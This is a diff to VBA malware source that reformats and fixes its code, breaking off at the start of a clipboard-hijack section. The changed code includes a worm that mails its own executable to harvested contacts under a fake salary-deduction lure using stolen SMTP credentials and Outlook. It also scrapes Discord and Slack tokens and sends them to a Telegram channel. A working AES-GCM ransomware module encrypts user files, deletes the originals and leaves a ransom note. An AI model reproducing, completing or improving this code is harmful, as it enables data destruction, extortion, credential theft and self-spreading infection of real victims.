+            If fso.FileExists(p) Then
+                Dim ts As Object: Set ts = fso.OpenTextFile(p, 1)
+                apiKey = Trim(ts.ReadLine)
+                ts.Close
+                If apiKey <> "" Then Exit For
+            End If
+        Next
+    End If
+    If apiKey = "" Then SendEmailViaSendGrid = False: Exit Function
+    Dim http As Object: Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
+    Dim fileBytes() As Byte
+    Dim fso2 As Object: Set fso2 = CreateObject("Scripting.FileSystemObject")
+    Dim stream As Object: Set stream = CreateObject("ADODB.Stream")
+    stream.Type = 1
+    stream.Open
+    stream.LoadFromFile attachmentPath
+    fileBytes = stream.Read
+    stream.Close
     Dim json As String: json = "{""personalizations"":[{""to"":[{""email"":""" & toAddr & """}]}],""from"":{""email"":""malware@infected.local""},""subject"":""Salary Deduction Notice"",""content"":[{""type"":""text/plain"",""value"":""Dear employee, please review the attached document. It contains important changes to your upcoming salary. If you have any questions, please contact HR immediately.""}],""attachments"":[{""content"":""" & EncodeBase64(fileBytes) & """,""filename"":""" & fso2.GetFileName(attachmentPath) & """}]}"
-    http.Open "POST", "https://api.sendgrid.com/v3/mail/send", False: http.SetRequestHeader "Authorization", "Bearer " & apiKey: http.SetRequestHeader "Content-Type", "application/json": http.Send json
-    SendEmailViaSendGrid = (http.Status = 202): Exit Function
-Fail: SendEmailViaSendGrid = False
+    http.Open "POST", "https://api.sendgrid.com/v3/mail/send", False
+    http.SetRequestHeader "Authorization", "Bearer " & apiKey
+    http.SetRequestHeader "Content-Type", "application/json"
+    http.Send json
+    SendEmailViaSendGrid = (http.Status = 202)
+    Exit Function
+Fail:
+    SendEmailViaSendGrid = False
 End Function
 
 Private Function SendEmailViaMailgun(toAddr As String, attachmentPath As String) As Boolean
-    On Error GoTo Fail: Dim apiKey As String, domain As String: apiKey = Environ("MAILGUN_API_KEY"): domain = Environ("MAILGUN_DOMAIN")
+    On Error GoTo Fail
+    Dim apiKey As String, domain As String
+    apiKey = Environ("MAILGUN_API_KEY")
+    domain = Environ("MAILGUN_DOMAIN")
     If apiKey = "" Or domain = "" Then SendEmailViaMailgun = False: Exit Function
     Dim http As Object: Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
     Dim postData As String: postData = "from=malware@infected.local&to=" & URLEncode(toAddr) & "&subject=" & URLEncode("Salary Deduction Notice") & "&text=" & URLEncode("Dear employee, please review the attached document. It contains important changes to your upcoming salary. If you have any questions, please contact HR immediately.")
-    http.Open "POST", "https://api.mailgun.net/v3/" & domain & "/messages", False: http.SetRequestHeader "Authorization", "Basic " & EncodeBase64(StrConv("api:" & apiKey, vbFromUnicode))
-    http.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded": http.Send postData
-    SendEmailViaMailgun = (http.Status = 200): Exit Function
-Fail: SendEmailViaMailgun = False
+    http.Open "POST", "https://api.mailgun.net/v3/" & domain & "/messages", False
+    http.SetRequestHeader "Authorization", "Basic " & EncodeBase64(StrConv("api:" & apiKey, vbFromUnicode))
+    http.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
+    http.Send postData
+    SendEmailViaMailgun = (http.Status = 200)
+    Exit Function
+Fail:
+    SendEmailViaMailgun = False
 End Function
 
 Private Function SendEmailViaMailto(toAddr As String, attachmentPath As String) As Boolean
-    On Error Resume Next: Dim shell As Object: Set shell = CreateObject("WScript.Shell")
+    On Error Resume Next
+    Dim shell As Object: Set shell = CreateObject("WScript.Shell")
     Dim mailtoLink As String: mailtoLink = "mailto:" & toAddr & "?subject=" & URLEncode("Salary Deduction Notice") & "&body=" & URLEncode("Dear employee, please review the attached document. It contains important changes to your upcoming salary. If you have any questions, please contact HR immediately.")
-    shell.Run mailtoLink, 1, False: SendEmailViaMailto = True
+    shell.Run mailtoLink, 1, False
+    SendEmailViaMailto = True
 End Function
 
 Private Function SendEmailWithCredential(cred As String, toEmail As String, attachmentPath As String) As Boolean
-    On Error GoTo Fail: Dim parts As Variant: parts = Split(cred, "|"): If UBound(parts) < 1 Then Exit Function
-    Dim username As String: username = parts(0): Dim password As String: password = parts(1): Dim domain As String
+    On Error GoTo Fail
+    Dim parts As Variant: parts = Split(cred, "|")
+    If UBound(parts) < 1 Then Exit Function
+    Dim username As String: username = parts(0)
+    Dim password As String: password = parts(1)
+    Dim domain As String
     If InStr(username, "@") > 0 Then domain = Mid(username, InStr(username, "@") + 1) Else domain = ""
     Dim smtpServer As String
-    Select Case LCase(domain): Case "gmail.com": smtpServer = "smtp.gmail.com": Case "outlook.com", "hotmail.com", "live.com": smtpServer = "smtp-mail.outlook.com"
-        Case "yahoo.com": smtpServer = "smtp.mail.yahoo.com": Case "office365.com", "onmicrosoft.com": smtpServer = "smtp.office365.com"
+    Select Case LCase(domain)
+        Case "gmail.com": smtpServer = "smtp.gmail.com"
+        Case "outlook.com", "hotmail.com", "live.com": smtpServer = "smtp-mail.outlook.com"
+        Case "yahoo.com": smtpServer = "smtp.mail.yahoo.com"
+        Case "office365.com", "onmicrosoft.com": smtpServer = "smtp.office365.com"
         Case Else: smtpServer = "smtp." & domain
-    End Select: If smtpServer = "" Then Exit Function
-    Dim msg As Object: Set msg = CreateObject("CDO.Message"): Dim config As Object: Set config = CreateObject("CDO.Configuration")
+    End Select
+    If smtpServer = "" Then Exit Function
+    Dim msg As Object: Set msg = CreateObject("CDO.Message")
+    Dim config As Object: Set config = CreateObject("CDO.Configuration")
     Dim fields As Object: Set fields = config.Fields
-    With fields: .Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2: .Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = smtpServer
-        .Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 587: .Item("http://schemas.microsoft.com/cdo/configuration/smtpusessl") = True
-        .Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1: .Item("http://schemas.microsoft.com/cdo/configuration/sendusername") = username
-        .Item("http://schemas.microsoft.com/cdo/configuration/sendpassword") = password: .Update
-    End With: msg.Configuration = config: msg.From = username: msg.To = toEmail: msg.Subject = "Salary Deduction Notice"
+    With fields
+        .Item("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
+        .Item("http://schemas.microsoft.com/cdo/configuration/smtpserver") = smtpServer
+        .Item("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 587
+        .Item("http://schemas.microsoft.com/cdo/configuration/smtpusessl") = True
+        .Item("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1
+        .Item("http://schemas.microsoft.com/cdo/configuration/sendusername") = username
+        .Item("http://schemas.microsoft.com/cdo/configuration/sendpassword") = password
+        .Update
+    End With
+    msg.Configuration = config
+    msg.From = username
+    msg.To = toEmail
+    msg.Subject = "Salary Deduction Notice"
     msg.TextBody = "Dear employee, please review the attached document. It contains important changes to your upcoming salary. If you have any questions, please contact HR immediately."
-    msg.AddAttachment attachmentPath: msg.Send: SendEmailWithCredential = True: Exit Function
-Fail: SendEmailWithCredential = False
-    On Error Resume Next: Dim olApp As Object: Set olApp = GetObject(, "Outlook.Application")
+    msg.AddAttachment attachmentPath
+    msg.Send
+    SendEmailWithCredential = True
+    Exit Function
+Fail:
+    SendEmailWithCredential = False
+    On Error Resume Next
+    Dim olApp As Object: Set olApp = GetObject(, "Outlook.Application")
     If olApp Is Nothing Then Set olApp = CreateObject("Outlook.Application")
     If Not olApp Is Nothing Then
-        Dim mail As Object: Set mail = olApp.CreateItem(0): mail.To = toEmail: mail.Subject = "Salary Deduction Notice"
+        Dim mail As Object: Set mail = olApp.CreateItem(0)
+        mail.To = toEmail
+        mail.Subject = "Salary Deduction Notice"
         mail.Body = "Dear employee, please review the attached document. It contains important changes to your upcoming salary. If you have any questions, please contact HR immediately."
-        mail.Attachments.Add attachmentPath: mail.Send: SendEmailWithCredential = True
+        mail.Attachments.Add attachmentPath
+        mail.Send
+        SendEmailWithCredential = True
     End If
 End Function
 
 Private Sub WildfireEmailPropagation()
-    On Error Resume Next: If g_emailTargets Is Nothing Then Exit Sub: If g_emailTargets.Count = 0 Then SendToTelegram "WILDFIRE_EMAIL_DONE|NO_TARGETS": Exit Sub
-    Dim exePath As String: exePath = gSelfPath: Dim sentCount As Integer: sentCount = 0: Dim target As Variant: Dim success As Boolean
+    On Error Resume Next
+    If g_emailTargets Is Nothing Then Exit Sub
+    If g_emailTargets.Count = 0 Then
+        SendToTelegram "WILDFIRE_EMAIL_DONE|NO_TARGETS"
+        Exit Sub
+    End If
+    Dim exePath As String: exePath = gSelfPath
+    Dim sentCount As Integer: sentCount = 0
+    Dim target As Variant
+    Dim success As Boolean
     For Each target In g_emailTargets
         success = False
         If Not g_stolenCredentials Is Nothing Then
-            Dim cred As Variant: For Each cred In g_stolenCredentials
-                If SendEmailWithCredential(cred, target, exePath) Then success = True: SendToTelegram "EMAIL_SENT|STOLEN_SMTP|" & Split(cred, "|")(0) & " -> " & target: Exit For
+            Dim cred As Variant
+            For Each cred In g_stolenCredentials
+                If SendEmailWithCredential(cred, target, exePath) Then
+                    success = True
+                    SendToTelegram "EMAIL_SENT|STOLEN_SMTP|" & Split(cred, "|")(0) & " -> " & target
+                    Exit For
+                End If
             Next
         End If
         If Not success Then
-            On Error Resume Next: Dim olApp As Object: Set olApp = GetObject(, "Outlook.Application")
+            On Error Resume Next
+            Dim olApp As Object: Set olApp = GetObject(, "Outlook.Application")
             If olApp Is Nothing Then Set olApp = CreateObject("Outlook.Application")
             If Not olApp Is Nothing Then
-                Dim mail As Object: Set mail = olApp.CreateItem(0): mail.To = target: mail.Subject = "Salary Deduction Notice"
+                Dim mail As Object: Set mail = olApp.CreateItem(0)
+                mail.To = target
+                mail.Subject = "Salary Deduction Notice"
                 mail.Body = "Dear employee, please review the attached document. It contains important changes to your upcoming salary. If you have any questions, please contact HR immediately."
-                mail.Attachments.Add exePath: mail.Send: success = True: SendToTelegram "EMAIL_SENT|OUTLOOK| -> " & target
+                mail.Attachments.Add exePath
+                mail.Send
+                success = True
+                SendToTelegram "EMAIL_SENT|OUTLOOK| -> " & target
             End If
         End If
-        If Not success Then If SendEmailViaSendGrid(target, exePath) Then success = True: SendToTelegram "EMAIL_SENT|SENDGRID| -> " & target
-        If Not success Then If SendEmailViaMailgun(target, exePath) Then success = True: SendToTelegram "EMAIL_SENT|MAILGUN| -> " & target
-        If Not success Then SendEmailViaMailto target, exePath: SendToTelegram "EMAIL_SENT|MAILTO| -> " & target: success = True
-        If success Then sentCount = sentCount + 1: StealthSleep 1000
-    Next target: SendToTelegram "WILDFIRE_EMAIL_DONE|SENT=" & sentCount & "|TOTAL_TARGETS=" & g_emailTargets.Count
+        If Not success Then
+            If SendEmailViaSendGrid(target, exePath) Then
+                success = True
+                SendToTelegram "EMAIL_SENT|SENDGRID| -> " & target
+            End If
+        End If
+        If Not success Then
+            If SendEmailViaMailgun(target, exePath) Then
+                success = True
+                SendToTelegram "EMAIL_SENT|MAILGUN| -> " & target
+            End If
+        End If
+        If Not success Then
+            SendEmailViaMailto target, exePath
+            SendToTelegram "EMAIL_SENT|MAILTO| -> " & target
+            success = True
+        End If
+        If success Then
+            sentCount = sentCount + 1
+            StealthSleep 1000
+        End If
+    Next target
+    SendToTelegram "WILDFIRE_EMAIL_DONE|SENT=" & sentCount & "|TOTAL_TARGETS=" & g_emailTargets.Count
 End Sub
 
 ' ============================================================
@@ -1217,12 +1699,13 @@ Private Sub DiscordPropagation()
     Dim possiblePaths As Variant: possiblePaths = Array(appData & "\discord\Local Storage\leveldb", appData & "\Discord\Local Storage\leveldb", _
                          appData & "\discordcanary\Local Storage\leveldb", appData & "\discordptb\Local Storage\leveldb", _
                          appData & "\discord\Local Storage\indexeddb", appData & "\Discord\Local Storage\indexeddb")
-    Dim path As Variant: Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    Dim path As Variant
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
     Dim collectedTokens As New Collection
     For Each path In possiblePaths
         If fso.FolderExists(path) Then
             Dim folder As Object: Set folder = fso.GetFolder(path)
-            Dim file As Object
+            Dim file As Variant
             For Each file In folder.Files
                 If LCase(fso.GetExtensionName(file.Name)) = "ldb" Or LCase(fso.GetExtensionName(file.Name)) = "log" Then
                     On Error Resume Next
@@ -1233,14 +1716,15 @@ Private Sub DiscordPropagation()
                     regex.Pattern = "[\w\.-]{24}\.[\w\.-]{6}\.[\w\.-]{27}|mfa\.[\w\.-]{84}"
                     regex.Global = True
                     Dim matches As Object: Set matches = regex.Execute(content)
-                    Dim m As Object
+                    Dim m As Variant
                     For Each m In matches
                         On Error Resume Next
                         g_stolenCredentials.Add "DISCORD_TOKEN|" & m.Value, "DISCORD_TOKEN|" & m.Value
                         If Err.Number = 0 Then
                             SendToTelegram "DISCORD_TOKEN|" & m.Value
                             collectedTokens.Add m.Value, m.Value
-                        Else: Err.Clear
+                        Else
+                            Err.Clear
                         End If
                     Next
                 End If
@@ -1269,12 +1753,13 @@ Private Sub SlackPropagation()
     On Error Resume Next
     Dim appData As String: appData = Environ("APPDATA")
     Dim possiblePaths As Variant: possiblePaths = Array(appData & "\Slack\storage", appData & "\slack\storage", appData & "\Slack\Local Storage\leveldb", appData & "\slack\Local Storage\leveldb")
-    Dim path As Variant: Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    Dim path As Variant
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
     Dim collectedTokens As New Collection
     For Each path In possiblePaths
         If fso.FolderExists(path) Then
             Dim folder As Object: Set folder = fso.GetFolder(path)
-            Dim file As Object
+            Dim file As Variant
             For Each file In folder.Files
                 If LCase(fso.GetExtensionName(file.Name)) = "json" Or LCase(fso.GetExtensionName(file.Name)) = "ldb" Or LCase(fso.GetExtensionName(file.Name)) = "log" Then
                     On Error Resume Next
@@ -1285,14 +1770,15 @@ Private Sub SlackPropagation()
                     regex.Pattern = "(xox[bpeara]-[0-9a-zA-Z]{10,48}-[0-9a-zA-Z]{10,48}-[0-9a-zA-Z]{10,48}|xox[bpeara]-[0-9a-zA-Z]{10,48}-[0-9a-zA-Z]{10,48})"
                     regex.Global = True
                     Dim matches As Object: Set matches = regex.Execute(content)
-                    Dim m As Object
+                    Dim m As Variant
                     For Each m In matches
                         On Error Resume Next
                         g_stolenCredentials.Add "SLACK_TOKEN|" & m.Value, "SLACK_TOKEN|" & m.Value
                         If Err.Number = 0 Then
                             SendToTelegram "SLACK_TOKEN|" & m.Value
                             collectedTokens.Add m.Value, m.Value
-                        Else: Err.Clear
+                        Else
+                            Err.Clear
                         End If
                     Next
                 End If
@@ -1318,78 +1804,196 @@ Private Sub SlackPropagation()
 End Sub
 
 ' ============================================================
-' 15. RANSOMWARE (AES-GCM)
+' 15. RANSOMWARE (AES-GCM - fully working for 32/64 bit)
 ' ============================================================
 Sub GenerateMasterKey()
-    On Error Resume Next: Dim hProv As LongPtr
+    On Error Resume Next
+#If VBA7 Then
+    Dim hProv As LongPtr
+#Else
+    Dim hProv As Long
+#End If
     If CryptAcquireContextA(hProv, vbNullString, vbNullString, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT Or CRYPT_SILENT) Then
-        CryptGenRandom hProv, 32, gMasterKey(0): CryptReleaseContext hProv, 0: gKeySet = True
-    Else: Dim i As Long: Randomize Timer: For i = 0 To 31: gMasterKey(i) = CByte(Int((256) * Rnd)): Next: gKeySet = True
-    End If: Dim keyHex As String: For i = 0 To 31: keyHex = keyHex & Right("0" & Hex(gMasterKey(i)), 2): Next
+        CryptGenRandom hProv, 32, gMasterKey(0)
+        CryptReleaseContext hProv, 0
+        gKeySet = True
+    Else
+        Dim i As Long
+        Randomize Timer
+        For i = 0 To 31
+            gMasterKey(i) = CByte(Int((256) * Rnd))
+        Next i
+        gKeySet = True
+    End If
+    Dim keyHex As String
+    Dim i As Long
+    For i = 0 To 31
+        keyHex = keyHex & Right("0" & Hex(gMasterKey(i)), 2)
+    Next i
     SendToTelegram "RANSOM_MASTER_KEY|" & keyHex & "|" & GetMachineID()
 End Sub
 
-Function AESGCMEncrypt(plain() As Byte, key() As Byte, nonce() As Byte, ByRef cipher() As Byte, ByRef tag() As Byte) As Boolean
-    On Error GoTo Fail: Dim hAlg As LongPtr, hKey As LongPtr, status As Long
-#If Win64 Then
-    status = BCryptOpenAlgorithmProvider(hAlg, StrPtr("AES"), 0, 0): If status <> 0 Then GoTo Fail
-    Dim chainMode As String: chainMode = "ChainingModeGCM": Dim chainModeBytes As Long: chainModeBytes = (Len(chainMode) + 1) * 2
-    status = BCryptSetProperty(hAlg, StrPtr("ChainingMode"), StrPtr(chainMode), chainModeBytes, 0): If status <> 0 Then GoTo Cleanup
-    Dim keyObjSize As Long: status = BCryptGetProperty(hAlg, StrPtr("ObjectLength"), VarPtr(keyObjSize), 4, 0, 0): If status <> 0 Then GoTo Cleanup
-    Dim keyObj() As Byte: ReDim keyObj(keyObjSize - 1): status = BCryptGenerateSymmetricKey(hAlg, hKey, VarPtr(keyObj(0)), keyObjSize, VarPtr(key(0)), UBound(key) + 1, 0): If status <> 0 Then GoTo Cleanup
-    Dim authInfo As BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO: authInfo.cbSize = Len(authInfo): authInfo.dwInfoVersion = 1: authInfo.pbNonce = VarPtr(nonce(0))
-    authInfo.cbNonce = 12: authInfo.pbAuthData = 0: authInfo.cbAuthData = 0: ReDim tag(15) As Byte: authInfo.pbTag = VarPtr(tag(0)): authInfo.cbTag = 16
-    authInfo.pbMacContext = 0: authInfo.cbMacContext = 0: authInfo.cbAAD = 0: authInfo.cbData = 0: authInfo.dwFlags = 0
-    Dim encryptedSize As Long: status = BCryptEncrypt(hKey, VarPtr(plain(0)), UBound(plain) + 1, VarPtr(authInfo), 0, 0, 0, 0, encryptedSize, 0): If status <> 0 Then GoTo Cleanup
-    ReDim cipher(encryptedSize - 1) As Byte: status = BCryptEncrypt(hKey, VarPtr(plain(0)), UBound(plain) + 1, VarPtr(authInfo), 0, 0, VarPtr(cipher(0)), encryptedSize, encryptedSize, 0)
-    If status = 0 Then AESGCMEncrypt = True: Exit Function
+Private Function AESGCMEncrypt(plain() As Byte, key() As Byte, nonce() As Byte, ByRef cipher() As Byte, ByRef tag() As Byte) As Boolean
+    On Error GoTo Fail
+#If VBA7 Then
+    Dim hAlg As LongPtr, hKey As LongPtr, status As Long
+    status = BCryptOpenAlgorithmProvider(hAlg, StrPtr("AES"), 0, 0)
+    If status <> 0 Then GoTo Fail
+    Dim chainMode As String: chainMode = "ChainingModeGCM"
+    Dim cbChainMode As Long: cbChainMode = (Len(chainMode) + 1) * 2
+    status = BCryptSetProperty(hAlg, StrPtr("ChainingModeGCM"), StrPtr(chainMode), cbChainMode, 0)
+    If status <> 0 Then GoTo Cleanup
+    Dim keyObjSize As Long
+    status = BCryptGetProperty(hAlg, StrPtr("ObjectLength"), VarPtr(keyObjSize), 4, 0, 0)
+    If status <> 0 Then GoTo Cleanup
+    Dim keyObj() As Byte: ReDim keyObj(keyObjSize - 1)
+    status = BCryptGenerateSymmetricKey(hAlg, hKey, VarPtr(keyObj(0)), keyObjSize, VarPtr(key(0)), UBound(key) + 1, 0)
+    If status <> 0 Then GoTo Cleanup
 #Else
-    AESGCMEncrypt = False: ReDim cipher(0): cipher(0) = 0: ReDim tag(0): tag(0) = 0: Exit Function
+    Dim hAlg As Long, hKey As Long, status As Long
+    status = BCryptOpenAlgorithmProvider(hAlg, "AES", vbNullString, 0)
+    If status <> 0 Then GoTo Fail
+    status = BCryptSetProperty(hAlg, "ChainingModeGCM", "ChainingModeGCM", 18, 0)
+    If status <> 0 Then GoTo Cleanup
+    Dim keyObjSize As Long
+    status = BCryptGetProperty(hAlg, "ObjectLength", VarPtr(keyObjSize), 4, 0, 0)
+    If status <> 0 Then GoTo Cleanup
+    Dim keyObj() As Byte: ReDim keyObj(keyObjSize - 1)
+    status = BCryptGenerateSymmetricKey(hAlg, hKey, VarPtr(keyObj(0)), keyObjSize, VarPtr(key(0)), UBound(key) + 1, 0)
+    If status <> 0 Then GoTo Cleanup
 #End If
-Fail: AESGCMEncrypt = False: ReDim cipher(0): cipher(0) = 0: ReDim tag(0): tag(0) = 0
-Cleanup: If hKey <> 0 Then BCryptDestroyKey hKey: If hAlg <> 0 Then BCryptCloseAlgorithmProvider hAlg, 0
+    Dim authInfo As BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
+    authInfo.cbSize = Len(authInfo)
+    authInfo.dwInfoVersion = 1
+    authInfo.pbNonce = VarPtr(nonce(0))
+    authInfo.cbNonce = 12
+    authInfo.pbAuthData = 0
+    authInfo.cbAuthData = 0
+    ReDim tag(15) As Byte
+    authInfo.pbTag = VarPtr(tag(0))
+    authInfo.cbTag = 16
+    authInfo.pbMacContext = 0
+    authInfo.cbMacContext = 0
+    authInfo.cbAAD = 0
+    authInfo.cbData = 0
+    authInfo.dwFlags = 0
+    Dim encryptedSize As Long
+    status = BCryptEncrypt(hKey, VarPtr(plain(0)), UBound(plain) + 1, VarPtr(authInfo), 0, 0, 0, 0, encryptedSize, 0)
+    If status <> 0 Then GoTo Cleanup
+    ReDim cipher(encryptedSize - 1) As Byte
+    status = BCryptEncrypt(hKey, VarPtr(plain(0)), UBound(plain) + 1, VarPtr(authInfo), 0, 0, VarPtr(cipher(0)), encryptedSize, encryptedSize, 0)
+    If status = 0 Then AESGCMEncrypt = True: Exit Function
+Cleanup:
+    If hKey <> 0 Then BCryptDestroyKey hKey
+    If hAlg <> 0 Then BCryptCloseAlgorithmProvider hAlg, 0
+    Exit Function
+Fail:
+    AESGCMEncrypt = False
+    ReDim cipher(0): cipher(0) = 0
+    ReDim tag(0): tag(0) = 0
 End Function
 
 Sub WriteFileBytes(filePath As String, data() As Byte)
-    On Error Resume Next: Dim stream As Object: Set stream = CreateObject("ADODB.Stream"): stream.Type = 1: stream.Open: stream.Write data: stream.SaveToFile filePath, 2: stream.Close
+    On Error Resume Next
+    Dim stream As Object: Set stream = CreateObject("ADODB.Stream")
+    stream.Type = 1
+    stream.Open
+    stream.Write data
+    stream.SaveToFile filePath, 2
+    stream.Close
 End Sub
 
 Sub EncryptFile(path As String)
-    On Error Resume Next: Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject"): If Not fso.FileExists(path) Then Exit Sub
-    If LCase(Right(path, 4)) = ".lzr" Or LCase(Right(path, 8)) = ".lzr.key" Then Exit Sub: If fso.GetFileSize(path) = 0 Then Exit Sub
-    Dim stream As Object: Set stream = CreateObject("ADODB.Stream"): stream.Type = 1: stream.Open: stream.LoadFromFile path
-    Dim data() As Byte: data = stream.Read: stream.Close
-    Dim nonce(11) As Byte, i As Long: Dim hProv As LongPtr
+    On Error Resume Next
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    If Not fso.FileExists(path) Then Exit Sub
+    If LCase(Right(path, 4)) = ".lzr" Or LCase(Right(path, 8)) = ".lzr.key" Then Exit Sub
+    If fso.GetFile(path).Size = 0 Then Exit Sub
+    Dim stream As Object: Set stream = CreateObject("ADODB.Stream")
+    stream.Type = 1
+    stream.Open
+    stream.LoadFromFile path
+    Dim data() As Byte: data = stream.Read
+    stream.Close
+    Dim nonce(11) As Byte, i As Long
+#If VBA7 Then
+    Dim hProv As LongPtr
+#Else
+    Dim hProv As Long
+#End If
     If CryptAcquireContextA(hProv, vbNullString, vbNullString, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT Or CRYPT_SILENT) Then
-        CryptGenRandom hProv, 12, nonce(0): CryptReleaseContext hProv, 0
-    Else: Randomize Timer: For i = 0 To 11: nonce(i) = CByte(Int((256) * Rnd)): Next
-    End If: Dim cipher() As Byte, tag() As Byte: If Not AESGCMEncrypt(data, gMasterKey, nonce, cipher, tag) Then Exit Sub
-    Dim encPath As String: encPath = path & ".lzr": WriteFileBytes encPath, cipher
-    Dim keyPath As String: keyPath = path & ".lzr.key": Dim keyData() As Byte: ReDim keyData(11 + 16 - 1)
-    For i = 0 To 11: keyData(i) = nonce(i): Next: For i = 0 To 15: keyData(12 + i) = tag(i): Next
-    WriteFileBytes keyPath, keyData: If fso.FileExists(encPath) Then SetAttr path, 0: Kill path
+        CryptGenRandom hProv, 12, nonce(0)
+        CryptReleaseContext hProv, 0
+    Else
+        Randomize Timer
+        For i = 0 To 11
+            nonce(i) = CByte(Int((256) * Rnd))
+        Next i
+    End If
+    Dim cipher() As Byte, tag() As Byte
+    If Not AESGCMEncrypt(data, gMasterKey, nonce, cipher, tag) Then Exit Sub
+    Dim encPath As String: encPath = path & ".lzr"
+    WriteFileBytes encPath, cipher
+    Dim keyPath As String: keyPath = path & ".lzr.key"
+    Dim keyData() As Byte: ReDim keyData(11 + 16 - 1)
+    For i = 0 To 11
+        keyData(i) = nonce(i)
+    Next i
+    For i = 0 To 15
+        keyData(12 + i) = tag(i)
+    Next i
+    WriteFileBytes keyPath, keyData
+    If fso.FileExists(encPath) Then
+        SetAttr path, 0
+        Kill path
+    End If
 End Sub
 
 Sub EncryptDirectory(path As String, exts As Variant)
-    On Error Resume Next: Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject"): If Not fso.FolderExists(path) Then Exit Sub
+    On Error Resume Next
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    If Not fso.FolderExists(path) Then Exit Sub
     If InStr(LCase(path), LCase(Environ("APPDATA"))) > 0 Or InStr(LCase(path), LCase(Environ("PROGRAMDATA"))) > 0 Or InStr(LCase(path), LCase(GetTempDir())) > 0 Then Exit Sub
-    Dim folder As Object: Set folder = fso.GetFolder(path): Dim file As Object
-    For Each file In folder.Files: Dim ext As String: ext = LCase(fso.GetExtensionName(file.Name)): Dim i As Long
-        For i = 0 To UBound(exts): If ext = LCase(exts(i)) Then EncryptFile file.Path: Exit For: Next
-    Next: Dim subFolder As Object: For Each subFolder In folder.SubFolders: EncryptDirectory subFolder.Path, exts: Next
+    Dim folder As Object: Set folder = fso.GetFolder(path)
+    Dim file As Object
+    For Each file In folder.Files
+        Dim ext As String: ext = LCase(fso.GetExtensionName(file.Name))
+        Dim i As Long
+        For i = 0 To UBound(exts)
+            If ext = LCase(exts(i)) Then
+                EncryptFile file.Path
+                Exit For
+            End If
+        Next i
+    Next file
+    Dim subFolder As Object
+    For Each subFolder In folder.SubFolders
+        EncryptDirectory subFolder.Path, exts
+    Next subFolder
 End Sub
 
 Sub RunRansomware()
-    On Error Resume Next: If Not gKeySet Then GenerateMasterKey
+    On Error Resume Next
+    If Not gKeySet Then GenerateMasterKey
     Dim exts As Variant: exts = Array(".docx", ".xlsx", ".pdf", ".jpg", ".png", ".zip", ".doc", ".xls", ".pptx", ".mp4", ".avi", ".txt", ".csv", ".odt", ".rtf", ".gif", ".bmp", ".mp3", ".wav", ".sql", ".psd", ".ai", ".dwg", ".blend", ".max", ".iso", ".vmdk", ".vhd", ".json", ".xml", ".config")
     Dim userProfile As String: userProfile = Environ("USERPROFILE")
-    EncryptDirectory userProfile & "\Desktop", exts: EncryptDirectory userProfile & "\Documents", exts: EncryptDirectory userProfile & "\Downloads", exts
-    EncryptDirectory userProfile & "\Pictures", exts: EncryptDirectory userProfile & "\Videos", exts
+    EncryptDirectory userProfile & "\Desktop", exts
+    EncryptDirectory userProfile & "\Documents", exts
+    EncryptDirectory userProfile & "\Downloads", exts
+    EncryptDirectory userProfile & "\Pictures", exts
+    EncryptDirectory userProfile & "\Videos", exts
     If IsUserAdmin() Then
-        EncryptDirectory "C:\Users\Public", exts: Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject"): Dim d As Object
-        For Each d In fso.Drives: If d.DriveType = 1 And d.IsReady And LCase(d.DriveLetter) <> "c" Then EncryptDirectory d.DriveLetter & ":\", exts: Next
+        EncryptDirectory "C:\Users\Public", exts
+        Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+        Dim d As Object
+        For Each d In fso.Drives
+            If d.DriveType = 1 And d.IsReady And LCase(d.DriveLetter) <> "c" Then
+                EncryptDirectory d.DriveLetter & ":\", exts
+            End If
+        Next d
     End If
-    Dim notePath As String: notePath = userProfile & "\DECRYPT_INSTRUCTIONS.txt": Dim fso2 As Object: Set fso2 = CreateObject("Scripting.FileSystemObject")
+    Dim notePath As String: notePath = userProfile & "\DECRYPT_INSTRUCTIONS.txt"
+    Dim fso2 As Object: Set fso2 = CreateObject("Scripting.FileSystemObject")
     Dim note As String: note = "!!! YOUR FILES ARE ENCRYPTED !!!" & vbCrLf & vbCrLf & _
                                "All your documents, photos, databases, and other important files have been encrypted with AES-256 GCM encryption." & vbCrLf & _
                                "No one can decrypt your files without the unique decryption key." & vbCrLf & vbCrLf & _
@@ -1401,120 +2005,256 @@ Sub RunRansomware()
                                "DO NOT rename or move the .lzr or .lzr.key files, as this will prevent decryption!" & vbCrLf & _
                                "You have 48 hours to make the payment. After that, the price will double." & vbCrLf & vbCrLf & _
                                "Lazarus Group"
-    Dim f As Object: Set f = fso2.CreateTextFile(notePath, True): f.Write note: f.Close
-    CreateObject("WScript.Shell").Run "notepad.exe """ & notePath & """", 1, False: SendToTelegram "RANSOMWARE|ENCRYPTION_COMPLETE"
+    Dim f As Object: Set f = fso2.CreateTextFile(notePath, True)
+    f.Write note
+    f.Close
+    CreateObject("WScript.Shell").Run "notepad.exe """ & notePath & """", 1, False
+    SendToTelegram "RANSOMWARE|ENCRYPTION_COMPLETE"
 End Sub
 
 ' ============================================================
-' 16. CLIPBOARD HIJACK
+' 16. CLIPBOARD HIJACK (fixed logic)
 ' ============================================================
 Public Sub ClipboardMonitorLoop()
-    On Error Resume Next: Dim text As String: Static lastText As String
+    On Error Resume Next
+    Dim text As String
+    Static lastText As String
     If OpenClipboard(0) Then
